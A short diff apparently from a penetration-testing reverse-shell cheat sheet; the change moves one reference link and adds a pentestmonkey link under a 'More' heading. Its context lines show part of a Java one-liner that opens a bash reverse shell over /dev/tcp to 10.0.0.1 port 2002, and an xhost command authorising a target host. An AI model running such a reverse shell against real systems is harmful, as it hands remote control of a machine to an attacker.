@@ -35,8 +35,6 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 
-https://highon.coffee/blog/reverse-shell-cheat-sheet/
-
 * * * 
 
 # Powershell
@@ -65,6 +63,11 @@ One way to do this is with Xnest (to be run on your system):
 You’ll need to authorise the target to connect to you (command also run on your host):
 
 ```xhost +targetip```
+
+**More:**
+
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 * * * 
 
